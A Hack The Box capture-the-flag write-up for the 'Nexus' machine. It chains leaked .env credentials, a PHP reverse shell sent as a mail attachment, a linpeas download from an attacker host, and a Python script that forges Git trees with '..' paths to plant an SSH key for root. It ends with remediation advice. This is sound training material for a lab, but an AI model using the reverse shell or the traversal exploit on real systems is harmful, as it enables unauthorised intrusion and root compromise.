---
title: "Nexus Write-up - HTB"
published: 2026-08-20
description: "From exposed Git configuration to root access through a vulnerable Gitea template synchroniser."
tags: [hack-the-box, ctf, web, gitea, git, privilege-escalation]
category: writeup
draft: false
---

# Hack The Box: Nexus Write-up

## Summary

Nexus was a satisfying chain rather than a single vulnerability. An exposed Git repository leaked application configuration, which led to code execution through a billing application. A second set of credentials provided SSH access as a normal user. Finally, a root-run Gitea template synchroniser trusted paths from Git tree objects, allowing a crafted repository to write an SSH key into root's account.

![](media/0_CJg2xojXGmlZoGJ-.png)

```text
Exposed Git configuration
        ↓
Billing application attachment execution
        ↓
www-data shell
        ↓
Updated credentials
        ↓
jones SSH access
        ↓
Crafted Git tree with .. entries
        ↓
/root/.ssh/authorized_keys
        ↓
Root shell
```
## 1. Discovering the applications

My initial scan showed the expected ports as filtered:

```bash
nmap -Pn -sC -sV -p80,993,1025,3306,6379 10.129.101.243
```

```text
80/tcp   filtered http
993/tcp  filtered imaps
1025/tcp filtered NFS-or-IIS
3306/tcp filtered mysql
6379/tcp filtered redis
```

- Found this mail in `http://nexus.htb` `j.mattew@nexus.htb`.
![[CTF/Nexus HTB/media/Pasted image 20260819010708.png]]Instead of stopping at the scan result, I continued with web enumeration. The following fuzzing command revealed two additional applications:

```bash
ffuf -u http://nexus.htb/FUZZ \
  -w /usr/share/wordlists/dirb/common.txt \
  -e .php,.html,.txt \
  -mc 200,204,301,302,307,401,403
```

- `http://git.nexus.htb/`
- `http://billing.nexus.htb/`

The Git instance exposed Nexus user information and repositories.


![Discovered Git accounts](media/Pasted%20image%2020260819010911.png)

## 2. Leaking application credentials

Reviewing the available Git content exposed an older `.env` file. The most useful value was:

```dotenv
DB_PASSWORD=N27xh!!2ucY04
```

![Leaked environment configuration](media/Pasted%20image%2020260819011626.png)

The rest of the configuration identified the application as Krayin CRM and confirmed its internal dependencies:

```dotenv
APP_NAME='Krayin CRM'
APP_ENV=local
APP_DEBUG=true
APP_URL=http://billing.nexus.htb
DB_CONNECTION=mysql
DB_HOST=krayin-mysql
DB_PORT=3306
DB_DATABASE=krayin
DB_USERNAME=krayin
MAIL_HOST=mailhog
MAIL_PORT=1025
IMAP_HOST=imap.nexus.htb
IMAP_PORT=993
REDIS_HOST=127.0.0.1
REDIS_PORT=6379
```

The leaked password authenticated successfully to the mail/billing workflow. This was the first reminder that old configuration should be treated as sensitive as current configuration: historical secrets are often still valid.

## 3. From the billing application to a shell

The billing application was PHP-based and processed attachments from the mail workflow.![[Pasted image 20260820192851.png]]![[Pasted image 20260820192909.png]]

![Billing application](media/Pasted%20image%2020260819011846.png)

I started a listener on my attack host:

```bash
nc -lvnp 4444
```

I then prepared the following PHP reverse shell, changing the address and port to match my listener:

```php
<?php
$ip = '10.10.17.189';
$port = 4444;

$sock = fsockopen($ip, $port);

$proc = proc_open(
    '/bin/bash -i',
    [
        0 => $sock,
        1 => $sock,
        2 => $sock
    ],
    $pipes
);

proc_close($proc);
?>
```

The attack steps were:

1. Send the PHP file as a mail attachment through the authenticated workflow.
2. Locate the message in the billing application.
3. Open the attachment.
4. Catch the callback in the Netcat listener.

![[Pasted image 20260820192929.png]]


![Reverse shell received](media/Pasted%20image%2020260819141516.png)

The resulting shell ran as `www-data`. Listing the home directory showed the next likely users:

```text
www-data@nexus:/home$ ls
git  jones
```

## 4. Moving to `jones`

The newer environment file on the host contained a different password:

```dotenv
APP_KEY=base64:n4swv+4YcBtCr1OPHBe69GxK06/X1y1vCQU1SIMIC7Q=
DB_PASSWORD=y27xb3ha!!74GbR
```

- This password authenticated as `jones` in Gitea:

![[Pasted image 20260820193834.png]]

It also worked over SSH, giving a stable user shell and the user flag.

![SSH access as jones](media/Pasted%20image%2020260819144042.png)

## 5. Finding the root path

I transferred `linpeas` to the target to review the local privilege-escalation surface:

```bash
jones@nexus:~# cd /tmp
jones@nexus:~# wget http://<ATTACKER_IP>:8000/linpeas.sh
jones@nexus:~# chmod +x linpeas.sh
jones@nexus:~# ./linpeas.sh | tee linpeas.out
```

The key finding was a scheduled Gitea synchronisation job:

```text
gitea-template-sync.timer
gitea-template-sync.service
```

The systemd unit confirmed that it ran as root:

```ini
[Unit]
Description=Sync Gitea templates
After=network-online.target

[Service]
Type=oneshot
User=root
ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py
TimeoutStartSec=50s
```

The Python program used `git ls-tree -r HEAD` to read paths from every template repository, then wrote those files into a staging directory. Critically, it performed no validation on the Git-provided path:

```python
for mode, objhash, filepath in entries:
    target = os.path.join(stage_path, filepath)
    target_dir = os.path.dirname(target)
    os.makedirs(target_dir, exist_ok=True)

    with open(target, 'wb') as handle:
        handle.write(cat_result.stdout)
```

`filepath` was attacker-controlled. A normal repository cannot create a folder called `..`, but raw Git tree objects can be constructed by hand. That makes it possible to give the synchroniser a traversal path such as `../../../../root/.ssh/authorized_keys`.

## 6. Building the malicious Git tree

First, I generated a key pair on the target. The public key would become root's `authorized_keys` file.

```bash
jones@nexus:~# cd /tmp
jones@nexus:~# ssh-keygen -t ed25519 -f /tmp/mykey -N ''
```

I created a repository in Gitea and made it as a template and cloned it locally as `jones`:![[Pasted image 20260820193917.png]]

```bash
jones@nexus:~# git clone http://jones:'y27xb3ha!!74GbR'@localhost:3000/jones/test.git
jones@nexus:~# cd test
```

- The following script creates Git blob, tree, and commit objects directly. It builds a tree where four `..` components lead to `/.ssh/authorized_keys`.
- Note, I didn't write the code, to fully understand what it does, check [Building a Malicious Git Tree for the Nexus HTB Escalation](Git%20Tree%20Writeup.md).

```python
#!/usr/bin/env python3
import hashlib
import os
import subprocess
import sys
import time
import zlib


def write_obj(data, obj_type):
    header = ("%s %d" % (obj_type, len(data))).encode() + b"\x00"
    raw = header + data
    sha = hashlib.sha1(raw).hexdigest()
    directory = os.path.join(".git", "objects", sha[:2])
    os.makedirs(directory, exist_ok=True)
    path = os.path.join(directory, sha[2:])
    if not os.path.exists(path):
        with open(path, "wb") as handle:
            handle.write(zlib.compress(raw))
    return sha


def entry(mode, name, sha):
    return ("%s %s" % (mode, name)).encode() + b"\x00" + bytes.fromhex(sha)


if not os.path.isdir(".git"):
    sys.exit("Run inside a Git repository")

result = subprocess.run(["cat", "/tmp/mykey.pub"], capture_output=True, text=True)
if result.returncode != 0:
    sys.exit("Create /tmp/mykey.pub first with ssh-keygen")

key = result.stdout.strip() + "\n"
key_blob = write_obj(key.encode(), "blob")
readme_blob = write_obj(b"# Template\n", "blob")

ssh_tree = write_obj(entry("100644", "authorized_keys", key_blob), "tree")
current = write_obj(entry("40000", ".ssh", ssh_tree), "tree")
current = write_obj(entry("40000", "root", current), "tree")

for _ in range(4):
    current = write_obj(entry("40000", "..", current), "tree")

root_tree = write_obj(
    entry("100644", "README.md", readme_blob) + entry("40000", "..", current),
    "tree",
)

timestamp = int(time.time())
commit = (
    "tree %s\n"
    "author x <x@x> %d +0000\n"
    "committer x <x@x> %d +0000\n\n"
    "init\n"
) % (root_tree, timestamp, timestamp)
commit_sha = write_obj(commit.encode(), "commit")

os.makedirs(os.path.join(".git", "refs", "heads"), exist_ok=True)
with open(os.path.join(".git", "refs", "heads", "main"), "w") as handle:
    handle.write(commit_sha + "\n")

print("Done:", commit_sha)
```

I ran the script, pushed the generated branch, and connected with the private key:

```bash
jones@nexus:~# python3 /tmp/exploit.py
jones@nexus:~# git push -u origin main --force
jones@nexus:~# ssh -i /tmp/mykey root@localhost
```

The warnings emitted during the push referenced `/root`, a useful sign that the crafted path was being processed:

```bash
root@nexus:~#ssh -i /tmp/mykey root@localhost
```

The SSH connection succeeded as root.

```bash
root@nexus:~# cat root.txt
997482990e3dd422393534f15d9ed5d5
```

## Lessons learned and remediation

Nexus demonstrates how a seemingly harmless file synchronisation task can become critical when it runs with elevated privileges.

- Never trust paths extracted from an archive, repository, or other external data source.
- Resolve each destination and verify that it remains beneath the intended base directory.
- Reject absolute paths and `.` / `..` components.
- Run automation under a dedicated unprivileged account.
- Do not commit `.env` files or historic secrets to repositories; rotate anything exposed.
- Never execute untrusted attachments on the server.

## Related post

For a focused explanation of the Git object internals and the crafted-tree technique, see [Building a Malicious Git Tree for the Nexus HTB Escalation](Git%20Tree%20Writeup.md).
